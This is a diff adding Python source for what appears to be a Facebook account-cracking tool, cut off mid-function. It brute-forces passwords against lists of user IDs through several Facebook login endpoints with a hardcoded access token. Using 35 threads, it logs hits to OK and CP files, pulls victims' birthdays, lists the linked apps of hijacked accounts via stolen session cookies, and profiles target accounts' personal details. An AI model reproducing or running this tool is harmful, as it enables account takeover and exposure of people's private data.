+    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
+        "x-fb-sim-hni": str(random.randint(20000, 40000)),
+        "x-fb-net-hni": str(random.randint(20000, 40000)),
+        "x-fb-connection-quality": "EXCELLENT",
+        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+        "user-agent": ua,
+        "content-type": "application/x-www-form-urlencoded",
+        "x-fb-http-engine": "Liger"}
+    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
+        'format': 'json', 
+        'sdk_version': '2', 
+        'email': em, 
+        'locale': 'en_US', 
+        'password': pas, 
+        'sdk': 'ios', 
+        'generate_session_cookies': '1', 
+        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
+    api = 'https://b-api.facebook.com/method/auth.login'
+    response = r.get(api, params=param, headers=header)
+    if 'session_key' in response.text and 'EAAA' in response.text:
+        return {"status":"success","email":em,"pass":pas}
+    elif 'www.facebook.com' in response.json()['error_msg']:
+        return {"status":"cp","email":em,"pass":pas}
+    else:return {"status":"error","email":em,"pass":pas}
+def log_mbasic(em,pas,hosts):
+    ua = open('ugent.txt','r').read()
+    r = requests.Session()
+    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    p = r.get("https://mbasic.facebook.com/")
+    b = bs4.BeautifulSoup(p.text,"html.parser")
+    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+    data={}
+    for i in b("input"):
+        if i.get("value") is None:
+            if i.get("name")=="email":
+                data.update({"email":em})
+            elif i.get("name")=="pass":
+                data.update({"pass":pas})
+            else:
+                data.update({i.get("name"):""})
+        else:
+            data.update({i.get("name"):i.get("value")})
+    data.update(
+        {"fb_dtsg":meta,"m_sess":"","__user":"0",
+        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+        }
+    )
+    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+    if "c_user" in list(r.cookies.get_dict().keys()):
+        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+    elif "checkpoint" in list(r.cookies.get_dict().keys()):
+        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+    else:return {"status":"error","email":em,"pass":pas}
+def log_free(em,pas,hosts):
+    ua = open('ugent.txt','r').read()
+    r = requests.Session()
+    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    p = r.get("https://free.facebook.com/")
+    b = bs4.BeautifulSoup(p.text,"html.parser")
+    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+    data={}
+    for i in b("input"):
+        if i.get("value") is None:
+            if i.get("name")=="email":
+                data.update({"email":em})
+            elif i.get("name")=="pass":
+                data.update({"pass":pas})
+            else:
+                data.update({i.get("name"):""})
+        else:
+            data.update({i.get("name"):i.get("value")})
+    data.update(
+        {"fb_dtsg":meta,"m_sess":"","__user":"0",
+        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
+        }
+    )
+    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+    if "c_user" in list(r.cookies.get_dict().keys()):
+        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+    elif "checkpoint" in list(r.cookies.get_dict().keys()):
+        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
+    else:return {"status":"error","email":em,"pass":pas}
+def cek_log(user, pasw, h_cp):
+    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
+    mb = "https://mbasic.facebook.com"
+    ses = requests.Session()
+    ses.headers.update({
+    "Host": "mbasic.facebook.com",
+    "cache-control": "max-age=0",
+    "upgrade-insecure-requests": "1",
+    "origin": mb,
+    "content-type": "application/x-www-form-urlencoded",
+    "user-agent": ua,
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "x-requested-with": "mark.via.gp",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-user": "?1",
+    "sec-fetch-dest": "document",
+    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
+    "accept-encoding": "gzip, deflate",
+    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+    })
+    data = {}
+    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+    fm = ged.find("form",{"method":"post"})
+    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
+    for i in fm.find_all("input"):
+        if i.get("name") in list:
+            data.update({i.get("name"):i.get("value")})
+        else:
+            continue
+    data.update({"email":user,"pass":pasw})
+    try:
+        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
+    except requests.exceptions.TooManyRedirects:
+        print("[!] Redirect Overload")
+    if "c_user" in ses.cookies:
+        return {"status":"error","email":user,"pass":pasw}
+    elif "checkpoint" in ses.cookies:
+        form = run.find("form")
+        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
+        jzst = form.find("input",{"name":"jazoest"})["value"]
+        nh   = form.find("input",{"name":"nh"})["value"]
+        dataD = {
+            "fb_dtsg": dtsg,
+            "fb_dtsg": dtsg,
+            "jazoest": jzst,
+            "jazoest": jzst,
+            "checkpoint_data":"",
+            "submit[Continue]":"Lanjutkan",
+            "nh": nh
+        }
+        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
+        ngew = [yy.text for yy in xnxx.find_all("option")]
+        opsi=[]
+        option_dev = []
+        for opt in range(len(ngew)):
+            option_dev.append("\n     "+P+str(opt+1)+". "+ngew[opt]+" ")
+        print(h_cp+"".join(option_dev))
+    elif "login_error" in str(run):
+        pass
+    else:
+        pass
+def koki(cookies):
+    result=[]
+    for i in enumerate(cookies.keys()):
+        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
+        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
+    sample = "".join(result)
+    sam_   = sample.replace(' ','')
+    samp_  = sam_.split(';')
+    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
+    return final
+def cek_apk(h_ok,_dapunta_):
+    apk = []
+    ses_ = requests.Session()
+    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
+    dat_game = ses_.get(url,cookies={'cookie':_dapunta_})
+    datagame = par(dat_game.content,'html.parser')
+    form_    = datagame.find('form',method='post')
+    for asu in form_.find_all("h3"):
+        try:
+            celeng = asu.find('span').text
+            apk.append('\n   • '+celeng)
+        except:pass
+    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
+    dat_game = ses_.get(url2,cookies={'cookie':_dapunta_})
+    datagame = par(dat_game.content,'html.parser')
+    form_    = datagame.find('form',method='post')
+    for asu in form_.find_all("h3"):
+        try:
+            celeng = asu.find('span').text
+            apk.append('\n   • '+celeng)
+        except:pass
+    print(h_ok+''.join(apk))
+def tahun(fx):
+    if len(fx)==15:
+        if fx[:10] in ['1000000000']       :tahunz = ' • 2009'
+        elif fx[:9] in ['100000000']       :tahunz = ' • 2009'
+        elif fx[:8] in ['10000000']        :tahunz = ' • 2009'
+        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' • 2009'
+        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' • 2010'
+        elif fx[:6] in ['100001']          :tahunz = ' • 2010/2011'
+        elif fx[:6] in ['100002','100003'] :tahunz = ' • 2011/2012'
+        elif fx[:6] in ['100004']          :tahunz = ' • 2012/2013'
+        elif fx[:6] in ['100005','100006'] :tahunz = ' • 2013/2014'
+        elif fx[:6] in ['100007','100008'] :tahunz = ' • 2014/2015'
+        elif fx[:6] in ['100009']          :tahunz = ' • 2015'
+        elif fx[:5] in ['10001']           :tahunz = ' • 2015/2016'
+        elif fx[:5] in ['10002']           :tahunz = ' • 2016/2017'
+        elif fx[:5] in ['10003']           :tahunz = ' • 2018'
+        elif fx[:5] in ['10004']           :tahunz = ' • 2019'
+        elif fx[:5] in ['10005']           :tahunz = ' • 2020'
+        elif fx[:5] in ['10006','10007','10008']:tahunz = ' • 2021'
+        else:tahunz=''
+    elif len(fx) in [9,10]:
+        tahunz = ' • 2008/2009'
+    elif len(fx)==8:
+        tahunz = ' • 2007/2008'
+    elif len(fx)==7:
+        tahunz = ' • 2006/2007'
+    else:tahunz=''
+    return tahunz
+class crack:
+    def __init__(self,files):
+        self.ada = []
+        self.cp = []
+        self.ko = 0
+        print('%s║'%(O))
+        print('%s╠══[%s•%s] %sCrack With Password Default/Manual [d/m]'%(O,P,O,P))
+        while True:
+            f = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+            if f=="":
+                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                menu()
+            elif f in ['m','M','2','02','002']:
+                try:
+                    while True:
+                        try:
+                            self.apk = files
+                            self.fs = open(self.apk).read().splitlines()
+                            break
+                        except Exception as e:
+                            print ("   %s"%(e))
+                            continue
+                    self.fl = []
+                    for i in self.fs:
+                        try:
+                            self.fl.append({"id":i.split("•")[0]})
+                        except:continue
+                except Exception as e:
+                    print(("   %s"%e))
+                    continue
+                print('%s╠══[%s•%s] %sFor example : jeeck,786786,123456'%(O,P,O,P))
+                self.pwlist()
+                break
+            elif f in ['d','D','1','01','001']:
+                try:
+                    while True:
+                        try:
+                            self.apk = files
+                            self.fs = open(self.apk).read().splitlines()
+                            break
+                        except Exception as e:
+                            print ("   %s"%(e))
+                            continue
+                    self.fl = []
+                    start_methodezz()
+                    kopi = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                    if kopi in ['']:
+                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                        menu()
+                    elif kopi in ['1','01']:
+                        for i in self.fs:
+                            try:
+                                self.fl.append({"id":i.split("•")[0],"pw":generate1(i.split("•")[1])})
+                            except:continue
+                    elif kopi in ['2','02']:
+                        for i in self.fs:
+                            try:
+                                self.fl.append({"id":i.split("•")[0],"pw":generate2(i.split("•")[1])})
+                            except:continue
+                    elif kopi in ['3','03']:
+                        for i in self.fs:
+                            try:
+                                self.fl.append({"id":i.split("•")[0],"pw":generate3(i.split("•")[1])})
+                            except:continue
+                    elif kopi in ['4','04']:
+                        os.system('rm -rf pass.txt')
+                        os.system('rm -rf passangka.txt')
+                        tambah_pass()
+                        tambah_pass_angka()
+                        for i in self.fs:
+                            try:
+                                self.fl.append({"id":i.split("•")[0],"pw":generate4(i.split("•")[1])})
+                            except:continue
+                    else:
+                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                        menu()
+                    start_method()
+                    put = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                    print('%s║'%(O))
+                    if put in ['']:
+                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                        menu()
+                    elif put in ['1','01','001','a']:
+                        print('%s╠══[%s•%s] %sBring Up  CP Option? [y/t]'%(O,P,O,P))
+                        puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                        if puf in ['']:
+                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            menu()
+                        elif puf in ['1','01','001','y','Y']:
+                            started()
+                            ThreadPool(35).map(self.api_opsi,self.fl)
+                            os.remove(self.apk)
+                            exit()
+                            break
+                        elif puf in ['2','02','002','t','T']:
+                            started()
+                            ThreadPool(35).map(self.api,self.fl)
+                            os.remove(self.apk)
+                            exit()
+                            break
+                        else:
+                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            menu()
+                    elif put in ['2','02','002','b']:
+                        print('%s╠══[%s•%s] %sBring Up  CP Option? [y/t]'%(O,P,O,P))
+                        puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                        if puf in ['']:
+                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            menu()
+                        elif puf in ['1','01','001','y','Y']:
+                            started()
+                            ThreadPool(35).map(self.mbasic_opsi,self.fl)
+                            os.remove(self.apk)
+                            exit()
+                            break
+                        elif puf in ['2','02','002','t','T']:
+                            started()
+                            ThreadPool(35).map(self.mbasic,self.fl)
+                            os.remove(self.apk)
+                            exit()
+                            break
+                        else:
+                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            menu()
+                    elif put in ['3','03','003','c']:
+                        print('%s╠══[%s•%s] %sBring up CP Option? [y/t]'%(O,P,O,P))
+                        puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                        if puf in ['']:
+                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            menu()
+                        elif puf in ['1','01','001','y','Y']:
+                            started()
+                            ThreadPool(35).map(self.free_opsi,self.fl)
+                            os.remove(self.apk)
+                            exit()
+                            break
+                        elif puf in ['2','02','002','t','T']:
+                            started()
+                            ThreadPool(35).map(self.free,self.fl)
+                            os.remove(self.apk)
+                            exit()
+                            break
+                        else:
+                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            menu()
+                    else:
+                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                        menu()
+                except Exception as e:
+                    print(("   %s"%e))
+    def pwlist(self):
+        self.pw = input('%s╠══[%s•%s] %sEnter Password : '%(O,P,O,P)).split(",")
+        if len(self.pw) ==0:
+            self.pwlist()
+        else:
+            for i in self.fl:
+                i.update({"pw":self.pw})
+            start_method()
+            put = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+            print('%s║'%(O))
+            if put in ['']:
+                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                menu()
+            elif put in ['1','01','001','a']:
+                print('%s╠══[%s•%s] %sBring up  CP Option? [y/t]'%(O,P,O,P))
+                puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                if puf in ['']:
+                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    menu()
+                elif puf in ['1','01','001','y','Y']:
+                    started()
+                    ThreadPool(30).map(self.api_opsi,self.fl)
+                    os.remove(self.apk)
+                    exit()
+                elif puf in ['2','02','002','t','T']:
+                    started()
+                    ThreadPool(30).map(self.api,self.fl)
+                    os.remove(self.apk)
+                    exit()
+                else:
+                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    menu()
+            elif put in ['2','02','002','b']:
+                print('%s╠══[%s•%s] %sBring up CP option? [y/t]'%(O,P,O,P))
+                puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                if puf in ['']:
+                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    menu()
+                elif puf in ['1','01','001','y','Y']:
+                    started()
+                    ThreadPool(30).map(self.mbasic_opsi,self.fl)
+                    os.remove(self.apk)
+                    exit()
+                elif puf in ['2','02','002','t','T']:
+                    started()
+                    ThreadPool(30).map(self.mbasic,self.fl)
+                    os.remove(self.apk)
+                    exit()
+                else:
+                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    menu()
+            elif put in ['3','03','003','c']:
+                print('%s╠══[%s•%s] %sBring up CP option? [y/t]'%(O,P,O,P))
+                puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                if puf in ['']:
+                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    menu()
+                elif puf in ['1','01','001','y','Y']:
+                    started()
+                    ThreadPool(30).map(self.free_opsi,self.fl)
+                    os.remove(self.apk)
+                    exit()
+                elif puf in ['2','02','002','t','T']:
+                    started()
+                    ThreadPool(30).map(self.free,self.fl)
+                    os.remove(self.apk)
+                    exit()
+                else:
+                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    menu()
+            else:
+                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                menu()
+    def api(self,fl):
+        try:
+            for i in fl.get("pw"):
+                log = log_api(fl.get("id"),
+                    i,"https://b-api.facebook.com")
+                if log.get("status")=="cp":
+                    try:
+                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
+                        tt = json.loads(ke.text)
+                        ttl = tt["birthday"]
+                        m,d,y = ttl.split("/")
+                        m = bulan_ttl[m]
+                        print("\r%s[%sjeeck%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
+                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
+                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
+                        break
+                    except(KeyError, IOError):
+                        m = " "
+                        d = " "
+                        y = " "
+                    except:pass
+                    print("\r%s[%sLosDool%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
+                    self.cp.append("%s•%s"%(fl.get("id"),i))
+                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                elif log.get("status")=="success":
+                    print("\r%s[%sLosDool%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
+                    self.ada.append("%s•%s"%(fl.get("id"),i))
+                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                else:continue
+                    
+            self.ko+=1
+            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+        except:
+            self.api(fl)
+    def api_opsi(self,fl):
+        try:
+            for i in fl.get("pw"):
+                log = log_api(fl.get("id"),
+                    i,"https://b-api.facebook.com")
+                if log.get("status")=="cp":
+                    try:
+                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
+                        tt = json.loads(ke.text)
+                        ttl = tt["birthday"]
+                        m,d,y = ttl.split("/")
+                        m = bulan_ttl[m]
+                        print("\r%s[%sLosDool%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
+                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
+                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
+                        break
+                    except(KeyError, IOError):
+                        m = " "
+                        d = " "
+                        y = " "
+                    except:pass
+                    print("\r%s[%sLosDool%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
+                    self.cp.append("%s•%s"%(fl.get("id"),i))
+                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                elif log.get("status")=="success":
+                    print("\r%s[%sLosDool%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
+                    print("")
+                    self.ada.append("%s•%s"%(fl.get("id"),i))
+                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                else:continue
+                    
+            self.ko+=1
+            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+        except:
+            self.api_opsi(fl)
+    def mbasic(self,fl):
+        try:
+            for i in fl.get("pw"):
+                log = log_mbasic(fl.get("id"),
+                    i,"https://mbasic.facebook.com")
+                if log.get("status")=="cp":
+                    try:
+                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
+                        tt = json.loads(ke.text)
+                        ttl = tt["birthday"]
+                        m,d,y = ttl.split("/")
+                        m = bulan_ttl[m]
+                        print("\r%s[%sLosDool%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
+                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
+                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
+                        break
+                    except(KeyError, IOError):
+                        m = " "
+                        d = " "
+                        y = " "
+                    except:pass
+                    print("\r%s[%sjeeck%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
+                    self.cp.append("%s•%s"%(fl.get("id"),i))
+                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                elif log.get("status")=="success":
+                    h_ok = "\r%s[%sLosDool%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    cek_apk(h_ok,koki(log.get("cookies")))
+                    self.ada.append("%s•%s"%(fl.get("id"),i))
+                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                else:continue
+                    
+            self.ko+=1
+            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+        except:
+            self.mbasic(fl)
+    def mbasic_opsi(self,fl):
+        try:
+            for i in fl.get("pw"):
+                log = log_mbasic(fl.get("id"),
+                    i,"https://mbasic.facebook.com")
+                if log.get("status")=="cp":
+                    try:
+                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
+                        tt = json.loads(ke.text)
+                        ttl = tt["birthday"]
+                        m,d,y = ttl.split("/")
+                        m = bulan_ttl[m]
+                        h_cp = "\r%s[%sLosDool%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
+                        cek_log(fl.get("id"),i,h_cp)
+                        print("")
+                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
+                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
+                        break
+                    except(KeyError, IOError):
+                        m = " "
+                        d = " "
+                        y = " "
+                    except:pass
+                    h_cp = "\r%s[%sjeeck%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
+                    cek_log(fl.get("id"),i,h_cp)
+                    print("")
+                    self.cp.append("%s•%s"%(fl.get("id"),i))
+                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                elif log.get("status")=="success":
+                    h_ok = "\r%s[%sLosDool%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    cek_apk(h_ok,koki(log.get("cookies")))
+                    print("")
+                    self.ada.append("%s•%s"%(fl.get("id"),i))
+                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                else:continue
+                    
+            self.ko+=1
+            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+        except:
+            self.mbasic_opsi(fl)
+    def free(self,fl):
+        try:
+            for i in fl.get("pw"):
+                log = log_free(fl.get("id"),
+                    i,"https://free.facebook.com")
+                if log.get("status")=="cp":
+                    try:
+                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
+                        tt = json.loads(ke.text)
+                        ttl = tt["birthday"]
+                        m,d,y = ttl.split("/")
+                        m = bulan_ttl[m]
+                        print("\r%s[%sLosDool%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
+                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
+                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
+                        break
+                    except(KeyError, IOError):
+                        m = " "
+                        d = " "
+                        y = " "
+                    except:pass
+                    print("\r%s[%sLosDool%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
+                    self.cp.append("%s•%s"%(fl.get("id"),i))
+                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                elif log.get("status")=="success":
+                    h_ok = "\r%s[%sjeeck%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    cek_apk(h_ok,koki(log.get("cookies")))
+                    self.ada.append("%s•%s"%(fl.get("id"),i))
+                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                else:continue
+                    
+            self.ko+=1
+            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+        except:
+            self.free(fl)
+    def free_opsi(self,fl):
+        try:
+            for i in fl.get("pw"):
+                log = log_free(fl.get("id"),
+                    i,"https://free.facebook.com")
+                if log.get("status")=="cp":
+                    try:
+                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
+                        tt = json.loads(ke.text)
+                        ttl = tt["birthday"]
+                        m,d,y = ttl.split("/")
+                        m = bulan_ttl[m]
+                        h_cp = "\r%s[%sLosDool%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
+                        cek_log(fl.get("id"),i,h_cp)
+                        print("")
+                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
+                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
+                        break
+                    except(KeyError, IOError):
+                        m = " "
+                        d = " "
+                        y = " "
+                    except:pass
+                    h_cp = "\r%s[%sjeeck%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
+                    cek_log(fl.get("id"),i,h_cp)
+                    print("")
+                    self.cp.append("%s•%s"%(fl.get("id"),i))
+                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                elif log.get("status")=="success":
+                    h_ok = "\r%s[%sLosDool%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    cek_apk(h_ok,koki(log.get("cookies")))
+                    print("")
+                    self.ada.append("%s•%s"%(fl.get("id"),i))
+                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
+                    break
+                else:continue
+                    
+            self.ko+=1
+            print("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+        except:
+            self.free_opsi(fl)
+def target():
+    try:token = open('token.txt','r').read()
+    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
+    idt = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
+    try:
+        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
+    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P));menu()
+    try:nm = zy["name"]
+    except (KeyError,IOError):nm = ("-")
+    try:nd = zy["first_name"]
+    except (KeyError,IOError):nd = ("-")
+    try:nt = zy["middle_name"]
+    except (KeyError,IOError):nt = ("-")
+    try:nb = zy["last_name"]
+    except (KeyError,IOError):nb = ("-")
+    try:ut = zy["birthday"]
+    except (KeyError,IOError):ut = ("-")
+    try:gd = zy["gender"]
+    except (KeyError,IOError):gd = ("-")
+    try:em = zy["email"]
+    except (KeyError,IOError):em = ("-")
+    try:lk = zy["link"]
+    except (KeyError,IOError):lk = ("-")
+    try:us = zy["username"]
+    except (KeyError,IOError):us = ("-")
+    try:rg = zy["religion"]
+    except (KeyError,IOError):rg = ("-")
+    try:rl = zy["relationship_status"]
+    except (KeyError,IOError):rl = ("-")
+    try:rls = zy["significant_other"]["name"]
+    except (KeyError,IOError):rls = ("-")
+    try:lc = zy["location"]["name"]
